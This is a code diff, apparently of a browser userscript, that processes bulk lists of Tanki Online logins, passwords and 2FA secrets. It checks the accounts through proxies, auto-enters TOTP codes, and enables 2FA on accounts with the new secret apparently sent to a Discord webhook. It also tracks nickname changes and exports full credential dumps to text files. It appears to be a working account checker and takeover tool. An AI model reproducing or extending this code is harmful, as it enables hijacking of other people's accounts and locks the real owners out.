+            const parsed = sortAccounts(raw);
+            for (const acc of parsed) {
+                if (!acc || !acc.login) continue;
+                const secret = normalize2FASecret(acc.twofaSecret);
+                if (!secret) continue;
+                rows.push({
+                    login: acc.login,
+                    password: acc.password || null,
+                    email: acc.email || null,
+                    nickname: acc.nickname || null,
+                    secret,
+                    rank: acc.rankFromBase || null,
+                    experience: acc.experience ?? null,
+                    rubies: acc.rubies,
+                    crystals: acc.crystals,
+                    tankoins: acc.tankoins,
+                    bound: acc.bound ?? null,
+                    year: acc.year ?? null
+                });
             }
-            added++;
-        }
+        } catch (_) {}
 
         for (const line of raw.split("\n").map(l => l.trim()).filter(Boolean)) {
-            if (/^(логин|пароль|ник|2fa|secret|почта)/i.test(line)) continue;
-            let m = line.match(/^([^\s:;]+)\s*[:;]\s*(\S+)\s*[:;]\s*([A-Za-z2-7]{16,})$/);
-            if (m) { pushRow(m[1], m[2], m[3]); continue; }
-            m = line.match(/^([^\s:;]+)\s*[:;]\s*([A-Za-z2-7]{16,})$/);
-            if (m) { pushRow(m[1], "", m[2]); continue; }
+            if (/^(логин|пароль|ник|2fa|secret|почта|компенсация|ранг)/i.test(line)) continue;
+            let m = line.match(/^([^\s:;]+)\s*[:;]\s*(\S+)\s*[:;]\s*([A-Za-z2-7=\s]{16,})$/i);
+            if (m) {
+                const secret = normalize2FASecret(m[3]);
+                if (secret) rows.push({ login: m[1].trim(), password: m[2].trim(), secret });
+                continue;
+            }
+            m = line.match(/^([^\s:;]+)\s*[:;]\s*([A-Za-z2-7=\s]{16,})$/i);
+            if (m) {
+                const secret = normalize2FASecret(m[2]);
+                if (secret) rows.push({ login: m[1].trim(), password: null, secret });
+            }
         }
 
         const blocks = raw.split(/^\s*[-=_*]{2,}\s*$/m).map(b => b.trim()).filter(Boolean);
-        for (const block of (blocks.length ? blocks : [raw])) {
+        for (const block of (blocks.length ? blocks : [])) {
             let login = null, password = null, secret = null, email = null, nick = null;
             for (const line of block.split("\n").map(l => l.trim()).filter(Boolean)) {
                 let m = line.match(/^(?:Логин|логин|Login)\s*[-:]\s*(.+)$/i);
                 if (m) { login = m[1].trim(); continue; }
                 m = line.match(/^(?:Пароль|пароль|Password)\s*[-:]\s*(.+)$/i);
                 if (m) { password = m[1].trim(); continue; }
-                m = line.match(/^(?:2FA|Secret|Секрет|secret|2fa secret)\s*[-:]\s*(.+)$/i);
+                m = line.match(/^(?:2FA(?:\s*secret)?|Secret|Секрет|2fa secret)\s*[-:]\s*(.+)$/i);
                 if (m) { secret = m[1].trim(); continue; }
-                m = line.match(/^(?:Почта|Email)\s*[-:]\s*(.+)$/i);
+                m = line.match(/^(?:Почта|Email|E-mail)\s*[-:]\s*(.+)$/i);
                 if (m) { email = m[1].trim(); continue; }
                 m = line.match(/^(?:Ник|Nickname)\s*[-:]\s*(.+)$/i);
                 if (m) { nick = m[1].trim(); continue; }
             }
-            if (login && secret) pushRow(login, password, secret, { email, nickname: nick });
+            const norm = normalize2FASecret(secret);
+            if (login && norm) {
+                rows.push({ login, password: password || null, email, nickname: nick, secret: norm });
+            }
         }
 
-        return { added, skipped };
+        const byLogin = new Map();
+        for (const r of rows) {
+            if (!r.login || !r.secret) { skipped++; continue; }
+            if (!isValid2FASecretFormat(r.secret)) { invalidSecret++; continue; }
+            byLogin.set(String(r.login).trim().toLowerCase(), r);
+        }
+
+        for (const r of byLogin.values()) {
+            const existed = get2FAByLogin(r.login);
+            let secretVerified = false;
+            try {
+                const v = await verify2FASecretWorks(r.secret);
+                if (v.ok) {
+                    secretVerified = true;
+                    verified++;
+                } else {
+                    verifyFail++;
+                }
+            } catch (_) {
+                verifyFail++;
+            }
+
+            const ok = upsert2FAAccount({
+                ...r,
+                secretVerified,
+                secretVerifiedAt: secretVerified ? new Date().toISOString() : null,
+                lastCodeCheck: secretVerified ? new Date().toISOString() : null,
+                activatedAt: existed?.activatedAt || new Date().toISOString()
+            });
+            if (ok) {
+                if (existed) updated++;
+                else added++;
+            } else {
+                skipped++;
+            }
+        }
+
+        const dedupe = dedupe2FAAccounts();
+        return {
+            added,
+            updated,
+            skipped,
+            invalidSecret,
+            verified,
+            verifyFail,
+            total: load2FAAccounts().length,
+            archivedDupSecret: dedupe.archivedDupSecret,
+            mergedLogin: dedupe.mergedLogin
+        };
+    }
+
+    async function track2FAFromAccount(account) {
+        if (!account || !account.login) return false;
+        const secret = normalize2FASecret(account.twofaSecret || account.secret);
+        if (!secret) return false;
+        let secretVerified = false;
+        try {
+            const v = await verify2FASecretWorks(secret);
+            secretVerified = !!v.ok;
+        } catch (_) {}
+        return upsert2FAAccount({
+            login: account.login,
+            password: account.password || null,
+            email: account.email || null,
+            nickname: account.nickname || null,
+            secret,
+            rank: account.rankFromBase || account.rank || null,
+            experience: account.experience ?? null,
+            rubies: account.rubies,
+            crystals: account.crystals,
+            tankoins: account.tankoins,
+            bound: account.bound ?? null,
+            year: account.year ?? null,
+            secretVerified,
+            secretVerifiedAt: secretVerified ? new Date().toISOString() : null
+        });
     }
 
     function get2FAByLogin(login) {
@@ -3390,10 +3873,6 @@ async function testDiscordNotification() {
         return load2FAAccounts().find(r => String(r.login || "").toLowerCase() === key) || null;
     }
 
-    /**
-     * Discord: secret + credentials чтобы не потерять доступ.
-     * Не зависит от DISCORD_RUBIES_NOTIFICATIONS — отправляется всегда, если webhook настроен.
-     */
     async function notify2FAEnabled(data) {
         if (!data || !data.secret || !isDiscordConfigured()) return false;
 
@@ -3481,107 +3960,298 @@ async function testDiscordNotification() {
     }
 
     function isLogin2FAVisible() {
-        const title = document.querySelector(".EntranceComponentStyle-title");
-        if (title && (title.textContent || "").includes("Код безопасности")) return true;
-        const input = document.querySelector(
-            "input[placeholder='000000'][maxlength='6'], " +
-            ".EntranceComponentStyle-ContainerForm input[maxlength='6']"
+        const titles = document.querySelectorAll(
+            ".EntranceComponentStyle-title, [class*='EntranceComponentStyle-title'], h1, h2, h3"
         );
-        if (input && document.querySelector(".EntranceComponentStyle-title")) {
-            const t = (document.querySelector(".EntranceComponentStyle-title")?.textContent || "");
-            if (/код безопасности|2fa|двухфактор/i.test(t)) return true;
+        for (const title of titles) {
+            const t = (title.textContent || "").trim();
+            if (/код\s*безопасности|security\s*code|2\s*fa|двухфактор/i.test(t)) return true;
+        }
+        const inputs = document.querySelectorAll(
+            "input[placeholder='000000'], input[placeholder*='000'], " +
+            "input[maxlength='6'][type='text'], input[maxlength='6'][type='tel'], " +
+            "input[maxlength='6'][inputmode='numeric'], " +
+            ".EntranceComponentStyle-ContainerForm input[maxlength='6'], " +
+            "[class*='EntranceComponent'] input[maxlength='6']"
+        );
+        for (const input of inputs) {
+            if (!input || !input.isConnected) continue;
+            const rect = input.getBoundingClientRect?.() || { width: 0, height: 0 };
+            if (rect.width < 2 || rect.height < 2) continue;
+            if (input.id === "username" || input.id === "password") continue;
+            if (input.closest("#captchaContainer")) continue;
+            return true;
         }
         return false;
     }
 
-    function resolve2FASecretForLogin(login, email) {
-        const candidates = [
-            login,
-            email,
-            normalizeEmail(email),
-            normalizeEmail(login)
-        ].filter(Boolean).map(s => String(s).trim());
-
-        for (const c of candidates) {
-            const row = get2FAByLogin(c);
-            if (row?.secret) return String(row.secret).replace(/\s+/g, "").toUpperCase();
+    function findLogin2FAInput() {
+        const preferred = [
+            ".EntranceComponentStyle-ContainerForm input[maxlength='6']",
+            ".EntranceComponentStyle-ContainerForm input[placeholder*='код' i]",
+            ".EntranceComponentStyle-ContainerForm input[placeholder*='code' i]",
+            "form input[maxlength='6'][placeholder*='код' i]",
+            "form input[maxlength='6'][placeholder*='значн' i]",
+            "input[placeholder='6-значный код']",
+            "input[placeholder*='6-знач']",
+            "input[placeholder='000000'][maxlength='6']",
+            "input[placeholder='000000']",
+            "input[placeholder*='000'][maxlength='6']",
+            "[class*='EntranceComponent'] input[maxlength='6']",
+            "input[maxlength='6'][inputmode='numeric']",
+            "input[type='tel'][maxlength='6']",
+            "input[type='text'][maxlength='6']"
+        ];
+        for (const sel of preferred) {
+            try {
+                for (const input of document.querySelectorAll(sel)) {
+                    if (!input || !input.isConnected) continue;
+                    if (input.id === "username" || input.id === "password") continue;
+                    if (input.closest("#captchaContainer")) continue;
+                    const rect = input.getBoundingClientRect?.() || { width: 0, height: 0 };
+                    if (rect.width < 2 || rect.height < 2) continue;
+                    const st = window.getComputedStyle?.(input);
+                    if (st && (st.visibility === "hidden" || st.display === "none")) continue;
+                    return input;
+                }
+            } catch (_) {}
         }
-        const list = load2FAAccounts();
-        const low = String(login || "").toLowerCase();
-        const elow = String(email || "").toLowerCase();
-        for (const r of list) {
-            if (!r?.secret) continue;
-            if (String(r.login || "").toLowerCase() === low) return String(r.secret).replace(/\s+/g, "").toUpperCase();
-            if (elow && String(r.email || "").toLowerCase() === elow) return String(r.secret).replace(/\s+/g, "").toUpperCase();
-            if (elow && String(r.login || "").toLowerCase() === elow) return String(r.secret).replace(/\s+/g, "").toUpperCase();
+        const title = [...document.querySelectorAll(".EntranceComponentStyle-title, span, h1, h2")]
+            .find(el => /код\s*безопасности/i.test(el.textContent || ""));
+        if (title) {
+            const form = title.closest("form") || title.parentElement;
+            const inp = form?.querySelector("input[maxlength='6'], input[type='text']");
+            if (inp) return inp;
         }
         return null;
     }
 
-    /**
-     * Если на экране входа виден запрос 2FA — ввести TOTP из хранилища.
-     * @returns {Promise<"solved"|"no_secret"|"not_visible"|"failed">}
-     */
-    async function solveLogin2FAIfPresent(login, email = null) {
-        if (!isLogin2FAVisible()) return "not_visible";
+    function clickLogin2FAConfirmButton() {
+        const block = document.querySelector(
+            ".EntranceComponentStyle-blockConfirmButton, [class*='blockConfirmButton']"
+        );
+        if (block) {
+            const btn = block.querySelector(
+                ".EntranceComponentStyle-buttonActive, [class*='buttonActive'], [class*='styleButtons']"
+            ) || block;
+            try {
+                btn.scrollIntoView?.({ block: "center", inline: "center" });
+            } catch (_) {}
+            const rect = btn.getBoundingClientRect?.() || { left: 0, top: 0, width: 1, height: 1 };
+            const x = rect.left + Math.max(rect.width / 2, 1);
+            const y = rect.top + Math.max(rect.height / 2, 1);
+            const opts = { view: window, bubbles: true, cancelable: true, composed: true, clientX: x, clientY: y, button: 0, buttons: 1 };
+            try {
+                for (const type of ["pointerdown", "mousedown", "pointerup", "mouseup", "click"]) {
+                    const Ctor = type.startsWith("pointer") ? PointerEvent : MouseEvent;
+                    btn.dispatchEvent(new Ctor(type, opts));
+                }
+            } catch (_) {}
+            try { btn.click(); } catch (_) {}
+            const span = block.querySelector("span");
+            if (span) {
+                try { span.click(); } catch (_) {}
+                robustClick(span);
+            }
+            robustClick(btn);
+            return true;
+        }
 
-        const secret = resolve2FASecretForLogin(login, email);
+        const form = document.querySelector(".EntranceComponentStyle-ContainerForm form, form");
+        const scope = form || document;
+        for (const el of scope.querySelectorAll("span, div, button, a")) {
+            const t = (el.textContent || "").trim().toLowerCase();
+            if (t !== "играть" && t !== "войти" && t !== "подтвердить" && t !== "ok" && t !== "готово") continue;
+            const clickable = el.closest(
+                ".EntranceComponentStyle-buttonActive, [class*='buttonActive'], [class*='styleButtons'], button, div"
+            ) || el;
+            robustClick(clickable);
+            try { clickable.click(); } catch (_) {}
+            return true;
+        }
+
+        if (form) {
+            try {
+                if (typeof form.requestSubmit === "function") {
+                    form.requestSubmit();
+                    return true;
+                }
+            } catch (_) {}
+            try {
+                form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
+                return true;
+            } catch (_) {}
+        }
+        return false;
+    }
+
+    function resolve2FASecretForLogin(login, email, extra = null) {
+        const cleanSecret = (s) => {
+            if (!s) return null;
+            const v = String(s).replace(/\s+/g, "").toUpperCase();
+            if (!v || v === "—" || v === "-" || !/^[A-Z2-7]{16,}$/.test(v)) return null;
+            return v;
+        };
+
+        if (extra) {
+            const fromExtra = cleanSecret(extra.twofaSecret || extra.secret);
+            if (fromExtra) return fromExtra;
+        }
+        try {
+            const st = getAccountStatus(login) || {};
+            const fromSt = cleanSecret(st.twofaSecret);
+            if (fromSt) return fromSt;
+        } catch (_) {}
+
+        const candidates = new Set();
+        const add = (v) => {
+            if (v == null) return;
+            const s = String(v).trim();
+            if (!s || s === "—" || s === "-") return;
+            candidates.add(s);
+            candidates.add(s.toLowerCase());
+        };
+        add(login);
+        add(email);
+        add(normalizeEmail(email));
+        add(normalizeEmail(login));
+        if (extra) {
+            add(extra.nickname);
+            add(extra.newNickname);
+            add(extra.username);
+            add(extra.fullName);
+        }
+        try {
+            const rub = (typeof RUBIES_ACCOUNTS !== "undefined" ? RUBIES_ACCOUNTS : [])
+                .find(a => String(a.login || "").toLowerCase() === String(login || "").toLowerCase());
+            if (rub) {
+                const fromRub = cleanSecret(rub.twofaSecret);
+                if (fromRub) return fromRub;
+                add(rub.nickname);
+                add(rub.newNickname);
+                add(rub.email);
+            }
+        } catch (_) {}
+        try {
+            const acc = (typeof ACCOUNTS !== "undefined" ? ACCOUNTS : [])
+                .find(a => String(a.login || "").toLowerCase() === String(login || "").toLowerCase());
+            if (acc) {
+                const fromAcc = cleanSecret(acc.twofaSecret);
+                if (fromAcc) return fromAcc;
+                add(acc.nickname);
+                add(acc.email);
+            }
+        } catch (_) {}
+
+        for (const c of candidates) {
+            const row = get2FAByLogin(c);
+            if (row?.secret) {
+                const s = cleanSecret(row.secret);
+                if (s) return s;
+            }
+        }
+
+        const list = load2FAAccounts();
+        const candLower = new Set([...candidates].map(s => String(s).toLowerCase()));
+        for (const r of list) {
+            if (!r?.secret) continue;
+            const keys = [r.login, r.email, r.nickname].filter(Boolean).map(x => String(x).toLowerCase());
+            if (keys.some(k => candLower.has(k))) {
+                const s = cleanSecret(r.secret);
+                if (s) return s;
+            }
+        }
+        return null;
+    }
+
+    async function solveLogin2FAIfPresent(login, email = null, extra = null) {
+        if (!isLogin2FAVisible()) {
+            const waitStart = Date.now();
+            while (Date.now() - waitStart < 4000) {
+                if (isLogin2FAVisible()) break;
+                if (document.querySelector(".UserInfoContainerStyle-userNameRank")) return "not_visible";
+                await sleep(200);
+            }
+            if (!isLogin2FAVisible()) return "not_visible";
+        }
+
+        const secret = resolve2FASecretForLogin(login, email, extra);
         if (!secret) {
-            console.warn("[2FA] Нет секрета для", login, email || "");
+            console.warn("[2FA] Нет секрета для", login, email || "", extra?.nickname || "");
             return "no_secret";
         }
 
         try {
-            let code = await generateTOTP(secret);
-            console.log("[2FA] Ввод кода для", login, "→", code);
-
-            const input = document.querySelector(
-                "input[placeholder='000000'][maxlength='6'], " +
-                ".EntranceComponentStyle-ContainerForm input[type='text'][maxlength='6'], " +
-                ".EntranceComponentStyle-ContainerForm input[maxlength='6']"
-            );
-            if (!input) return "failed";
-
-            setValueNative(input, "");
-            await humanType(input, code);
-            await sleep(randomDelay(250, 450));
-
-            const btnCandidates = [
-                ...document.querySelectorAll(
-                    ".EntranceComponentStyle-buttonActive, .RoundBigButtonComponentStyle-commonContainer, button, span"
-                )
-            ];
-            let clicked = false;
-            for (const el of btnCandidates) {
-                const t = (el.textContent || "").trim().toLowerCase();
-                if (t === "войти" || t === "подтвердить" || t === "играть" || t === "ok" || t === "готово") {
-                    const parent = el.closest(".EntranceComponentStyle-buttonActive, .RoundBigButtonComponentStyle-commonContainer") || el;
-                    robustClick(parent);
-                    clicked = true;
-                    break;
+            let attempts = 0;
+            while (attempts < 3 && isLogin2FAVisible()) {
+                attempts++;
+                const remaining = 30 - (Math.floor(Date.now() / 1000) % 30);
+                if (remaining <= 2) {
+                    console.log("[2FA] Ждём новый период TOTP (" + remaining + "с)…");
+                    await sleep((remaining + 1) * 1000);
                 }
-            }
-            if (!clicked) {
-                try {
-                    input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", code: "Enter", keyCode: 13, bubbles: true }));
-                } catch (_) {}
-            }
 
-            await sleep(randomDelay(1200, 1800));
+                let code = await generateTOTP(secret);
+                console.log("[2FA] Ввод кода для", login, "попытка", attempts, "→", code);
 
-            if (isLogin2FAVisible()) {
-                code = await generateTOTP(secret);
+                let input = findLogin2FAInput();
+                if (!input) {
+                    await sleep(400);
+                    input = findLogin2FAInput();
+                }
+                if (!input) {
+                    console.warn("[2FA] Поле ввода кода не найдено");
+                    return "failed";
+                }
+
+                try { input.focus(); } catch (_) {}
                 setValueNative(input, "");
-                await humanType(input, code);
-                await sleep(300);
-                for (const el of document.querySelectorAll(".EntranceComponentStyle-buttonActive, span")) {
-                    const t = (el.textContent || "").trim().toLowerCase();
-                    if (t === "войти" || t === "подтвердить" || t === "играть") {
-                        robustClick(el.closest(".EntranceComponentStyle-buttonActive") || el);
-                        break;
-                    }
+                await sleep(50);
+                setValueNative(input, code);
+                try {
+                    input.value = code;
+                    input.dispatchEvent(new InputEvent("input", { bubbles: true, data: code, inputType: "insertText" }));
+                    input.dispatchEvent(new Event("change", { bubbles: true }));
+                    input.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, key: "0" }));
+                } catch (_) {}
+                if (String(input.value || "").replace(/\D/g, "") !== String(code)) {
+                    setValueNative(input, "");
+                    await humanType(input, code);
+                    setValueNative(input, code);
                 }
-                await sleep(randomDelay(1200, 1800));
+                console.log("[2FA] Поле после ввода:", JSON.stringify(input.value));
+
+                await sleep(randomDelay(200, 350));
+
+                const clicked = clickLogin2FAConfirmButton();
+                console.log("[2FA] Клик «Играть»/confirm:", clicked ? "OK" : "не найден, Enter");
+                if (!clicked) {
+                    try {
+                        input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", code: "Enter", keyCode: 13, which: 13, bubbles: true }));
+                        input.dispatchEvent(new KeyboardEvent("keypress", { key: "Enter", code: "Enter", keyCode: 13, which: 13, bubbles: true }));
+                        input.dispatchEvent(new KeyboardEvent("keyup", { key: "Enter", code: "Enter", keyCode: 13, which: 13, bubbles: true }));
+                    } catch (_) {}
+                    await sleep(100);
+                    clickLogin2FAConfirmButton();
+                }
+
+                const waitUntil = Date.now() + 3500;
+                while (Date.now() < waitUntil) {
+                    if (document.querySelector(".UserInfoContainerStyle-userNameRank")) {
+                        console.log("[2FA] ✅ Код принят для", login, "(лобби)");
+                        return "solved";
+                    }
+                    if (!isLogin2FAVisible()) {
+                        console.log("[2FA] ✅ Код принят для", login);
+                        return "solved";
+                    }
+                    if (Date.now() > waitUntil - 2000) {
+                        clickLogin2FAConfirmButton();
+                    }
+                    await sleep(200);
+                }
+
+                console.warn("[2FA] Код не принят, повтор… value=", input?.value);
             }
 
             if (isLogin2FAVisible()) return "failed";
@@ -3706,11 +4376,6 @@ async function testDiscordNotification() {
         return false;
     }
 
-    /**
-     * Включить 2FA на текущем аккаунте (должен быть уже в Настройках → Аккаунт
-     * или хотя бы в разделе Настройки).
-     * Возвращает { ok, secret, already, error }.
-     */
     async function enable2FAOnCurrentAccount(meta = {}) {
         try {
             const inSettings = getCurrentSectionName() &&
@@ -4306,6 +4971,7 @@ async function testDiscordNotification() {
             upsertValidResult({
                 login,
                 password,
+                email: finalEmail && finalEmail !== "нет" ? finalEmail : (accInfo.email || (loginWasEmail ? usedLogin : null) || null),
                 username: nickname,
                 rank: rankName,
                 experience,
@@ -4316,6 +4982,7 @@ async function testDiscordNotification() {
                 bonusReceived,
                 newNickname: changedNickname || null,
                 loginWasEmail,
+                loginEmail: loginWasEmail ? usedLogin : null,
                 proxyIp: ip,
                 source: "checker",
                 twofaSecret: (twofaEnableResult && twofaEnableResult.secret) || (get2FAByLogin(login)?.secret) || null
@@ -4985,39 +5652,199 @@ async function testDiscordNotification() {
         return [...map.values()].filter(a => a.login && (a.password || a.entranceHash));
     }
 
+    function hasRubiesCompensation(acc, st) {
+        if (isBonusConfirmed(acc?.bonusReceived)) return true;
+        if (isBonusConfirmed(st?.bonusReceived)) return true;
+        return false;
+    }
+
+    function shouldKeepInDailyRubies(acc, st) {
+        st = st || {};
+        acc = acc || {};
+        if (hasRubiesCompensation(acc, st)) return true;
+        if (st.rubiesEligible === true) return true;
+        if (st.rubiesEnabled === true) return true;
+        if (st.rubiesRemainingDays != null && Number(st.rubiesRemainingDays) > 0) return true;
+        if (st.rubiesCompletedDays != null && Number(st.rubiesCompletedDays) > 0) return true;
+        if (st.rubiesTotalDays != null && Number(st.rubiesTotalDays) > 0) return true;
+        if (st.lastRubiesCollection) return true;
+        if (st.rubiesStatus && st.rubiesStatus !== "Ошибка" && st.rubiesStatus !== "Отключён") {
+            if (!st.invalid && !st.rubiesSkipPermanent) return true;
+        }
+        if (st.rubiesNoDaily === false) return true;
+        if (st.rubiesSubscriptionFinished === true) return true; 
+        return false;
+    }
+
+    function buildRubiesAccountExportLines(acc) {
+        const st = getAccountStatus(acc.login) || acc.status || {};
+        const email = normalizeEmail(acc.email) || normalizeEmail(st.loginEmail) || null;
+        const twofa = get2FAByLogin(acc.login);
+        const secret = (twofa && twofa.secret) || acc.twofaSecret || st.twofaSecret || null;
+        const statusRub = st.rubiesNoDaily
+            ? "Нет дейликов"
+            : (st.rubiesSubscriptionFinished ? "Подписка завершена" : (st.rubiesStatus || "Не собрано"));
+        const progress = (st.rubiesCompletedDays != null || st.rubiesTotalDays != null)
+            ? `${st.rubiesCompletedDays || 0}/${st.rubiesTotalDays || 0}`
+            : "—";
+        const v = (x) => (x === null || x === undefined || x === "" || x === "null") ? "—" : String(x);
+        const lines = [
+            "--------------------------",
+            "Логин - " + v(acc.login),
+            "Пароль - " + v(acc.password),
+            "Ник - " + v(st.username || acc.nickname || acc.login),
+            "Почта - " + v(email),
+            "Ранг - " + v(st.rank || acc.rankFromBase),
+            "Опыт - " + v(st.experience ?? acc.experience),
+            "Рубины - " + (st.rubies != null || acc.rubies != null ? formatAmount(st.rubies ?? acc.rubies) : "—"),
+            "Кристаллы - " + (st.crystals != null || acc.crystals != null ? formatAmount(st.crystals ?? acc.crystals) : "—"),
+            "Золотые ящики - " + (st.goldBoxes != null || acc.goldBoxes != null ? formatAmount(st.goldBoxes ?? acc.goldBoxes) : "—"),
+            "Танкоины - " + (st.tankoins != null || acc.tankoins != null ? formatAmount(st.tankoins ?? acc.tankoins) : "—"),
+            "Год - " + v(acc.year),
+            "Привязан - " + (acc.bound === true || st.bound === true ? "да" : (acc.bound === false || st.bound === false ? "нет" : "—")),
+            "Смена ника - " + v(st.nickChange || acc.nickChange),
+            "Компенсация - " + (hasRubiesCompensation(acc, st) ? "да" : "нет"),
+            "Новый ник - " + v(st.newNickname || acc.newNickname),
+            "IP - " + v(st.proxyIp || acc.proxyIp),
+            "Статус рубинов - " + statusRub,
+            "Прогресс рубинов - " + progress,
+            "2FA secret - " + (secret || "—")
+        ];
+        return lines.join("\n");
+    }
+
+    function downloadTxtFile(filename, text) {
+        const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = filename;
+        a.click();
+        setTimeout(() => URL.revokeObjectURL(a.href), 1000);
+    }
+
     function exportAllRubiesTxt() {
         const accounts = getAllRubiesStoredAccounts();
         if (!accounts.length) return showToast("Нет сохранённых Daily Rubies аккаунтов", "warning");
-        const textOut = accounts.map(acc => {
-            const st = getAccountStatus(acc.login) || acc.status || {};
-            const email = normalizeEmail(acc.email) || normalizeEmail(st.loginEmail) || "—";
-            const statusRub = st.rubiesNoDaily
-                ? "Нет дейликов"
-                : (st.rubiesSubscriptionFinished ? "Подписка завершена" : (st.rubiesStatus || "Не собрано"));
-            const progress = (st.rubiesCompletedDays != null || st.rubiesTotalDays != null)
-                ? `${st.rubiesCompletedDays || 0}/${st.rubiesTotalDays || 0}`
-                : "—";
-            const lines = [
-                "---------------------------------------------",
-                "Логин - " + (acc.login || "—"),
-                "Пароль - " + (acc.password || "—"),
-                "Почта - " + email,
-                "Ранг - " + (st.rank || acc.rankFromBase || "—"),
-                "Статус рубинов - " + statusRub,
-                "Прогресс рубинов - " + progress,
-                "Количество рубинов - " + formatAmount(st.rubies || "0")
-            ];
-            const twofa = get2FAByLogin(acc.login);
-            if (twofa?.secret) lines.push("2FA secret - " + twofa.secret);
-            return lines.join("\n");
-        }).join("\n") + "\n---------------------------------------------";
-        const blob = new Blob([textOut], { type: "text/plain;charset=utf-8" });
-        const a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = `tanki-daily-rubies-all-${new Date().toISOString().slice(0, 10)}.txt`;
-        a.click();
-        setTimeout(() => URL.revokeObjectURL(a.href), 1000);
+        const textOut = accounts.map(buildRubiesAccountExportLines).join("\n");
+        downloadTxtFile(`tanki-daily-rubies-all-${new Date().toISOString().slice(0, 10)}.txt`, textOut);
         showToast(`Выгружено ${accounts.length} аккаунтов`, "success");
+    }
+
+    function exportRubiesWithoutBonusTxt() {
+        const accounts = getAllRubiesStoredAccounts().filter(acc => {
+            const st = getAccountStatus(acc.login) || acc.status || {};
+            return !shouldKeepInDailyRubies(acc, st);
+        });
+        if (!accounts.length) return showToast("Нет аккаунтов без компенсации", "info");
+        const textOut = accounts.map(buildRubiesAccountExportLines).join("\n");
+        downloadTxtFile(`tanki-daily-rubies-NO-bonus-${new Date().toISOString().slice(0, 10)}.txt`, textOut);
+        showToast(`Без компенсации: ${accounts.length} акк. выгружено`, "success");
+    }
+
+    function removeRubiesWithoutBonus() {
+        const before = RUBIES_ACCOUNTS.length;
+        const keep = [];
+        const removed = [];
+        for (const acc of RUBIES_ACCOUNTS) {
+            const st = getAccountStatus(acc.login) || {};
+            if (shouldKeepInDailyRubies(acc, st)) keep.push(acc);
+            else removed.push(acc.login);
+        }
+        if (!removed.length) {
+            showToast("Нечего удалять — все с компенсацией или список пуст", "info");
+            return 0;
+        }
+        try {
+            const textOut = removed.map(login => {
+                const acc = getAllRubiesStoredAccounts().find(a => a.login === login)
+                    || { login, password: "" };
+                const full = RUBIES_ACCOUNTS.find(a => a.login === login) || acc;
+                return buildRubiesAccountExportLines(full);
+            }).join("\n");
+            downloadTxtFile(`tanki-daily-rubies-REMOVED-no-bonus-${new Date().toISOString().slice(0, 10)}.txt`, textOut);
+        } catch (_) {}
+
+        RUBIES_ACCOUNTS = keep;
+        saveRubiesAccounts();
+        try {
+            const queue = getRubiesRunQueue().filter(l => keep.some(a => a.login === l));
+            saveRubiesRunQueue(queue);
+            if (getRubiesRunCursor() > queue.length) saveRubiesRunCursor(queue.length);
+        } catch (_) {}
+        showToast(`Удалено без компенсации: ${removed.length} (было ${before}, осталось ${keep.length}). Бэкап скачан.`, "success");
+        return removed.length;
+    }
+
+    function restoreRubiesFromKnownStatuses() {
+        const existing = new Set(RUBIES_ACCOUNTS.map(a => String(a.login || "").toLowerCase()));
+        let added = 0;
+
+        const tryAdd = (login, base = {}) => {
+            const key = String(login || "").trim().toLowerCase();
+            if (!key || existing.has(key)) return false;
+            const st = getAccountStatus(login) || {};
+            const fromAccounts = ACCOUNTS.find(a => String(a.login || "").toLowerCase() === key) || {};
+            const fromArchive = RUBIES_ARCHIVE.find(a => String(a.login || "").toLowerCase() === key) || {};
+            const merged = {
+                ...fromArchive,
+                ...fromAccounts,
+                ...base,
+                login: fromAccounts.login || fromArchive.login || base.login || login,
+                password: base.password || fromAccounts.password || fromArchive.password || "",
+                email: normalizeEmail(base.email || fromAccounts.email || fromArchive.email),
+                entranceHash: base.entranceHash || fromAccounts.entranceHash || fromArchive.entranceHash || null
+            };
+            if (!shouldKeepInDailyRubies(merged, st) && !shouldKeepInDailyRubies(fromArchive, fromArchive.status || st)) {
+                if (!st.rubiesRemainingDays && !st.rubiesCompletedDays && !st.lastRubiesCollection && !st.bonusReceived && !st.rubiesEligible) {
+                    return false;
+                }
+            }
+            if (!merged.password && !merged.entranceHash) return false;
+            if (addRubiesAccount(merged)) {
+                existing.add(key);
+                added++;
+                return true;
+            }
+            return false;
+        };
+
+        for (const a of RUBIES_ARCHIVE) {
+            if (!a || !a.login) continue;
+            tryAdd(a.login, a);
+        }
+
+        for (const a of ACCOUNTS) {
+            if (!a || !a.login) continue;
+            const st = getAccountStatus(a.login) || {};
+            if (!shouldKeepInDailyRubies(a, st)) continue;
+            tryAdd(a.login, a);
+        }
+
+        try {
+            if (typeof GM_listValues === "function") {
+                const keys = GM_listValues() || [];
+                const prefix = CONFIG.DB_PREFIX;
+                for (const k of keys) {
+                    if (!String(k).startsWith(prefix)) continue;
+                    const login = String(k).slice(prefix.length);
+                    if (!login || existing.has(login.toLowerCase())) continue;
+                    const st = getAccountStatus(login) || {};
+                    if (!shouldKeepInDailyRubies({ login }, st) &&
+                        st.rubiesRemainingDays == null &&
+                        st.rubiesCompletedDays == null &&
+                        !st.lastRubiesCollection &&
+                        !st.bonusReceived &&
+                        !st.rubiesEligible) continue;
+                    tryAdd(login, { login, password: st.password || "" });
+                }
+            }
+        } catch (e) {
+            console.warn("[Daily Rubies] restore scan error", e);
+        }
+
+        if (added) saveRubiesAccounts();
+        console.log(`[Daily Rubies] Восстановлено аккаунтов: ${added}`);
+        return added;
     }
 
     function saveRubiesList(list) {
@@ -5153,11 +5980,12 @@ async function testDiscordNotification() {
     function setEntranceHash(hash) {
         if (!hash) return false;
         try {
-            localStorage.setItem('entrance_hash_key', hash);
-            try { sessionStorage.removeItem('entrance_hash_key'); } catch (_) {}
-            return true;
+            const ok = safeLocalStorageSetItem("entrance_hash_key", hash);
+            try { sessionStorage.removeItem("entrance_hash_key"); } catch (_) {}
+            if (!ok) console.warn("[Daily Rubies] Не удалось записать entrance_hash_key в localStorage");
+            return ok;
         } catch (e) {
-            console.warn('[Daily Rubies] Не удалось записать entrance_hash_key в localStorage', e);
+            console.warn("[Daily Rubies] Не удалось записать entrance_hash_key в localStorage", e);
             return false;
         }
     }
@@ -5167,6 +5995,192 @@ async function testDiscordNotification() {
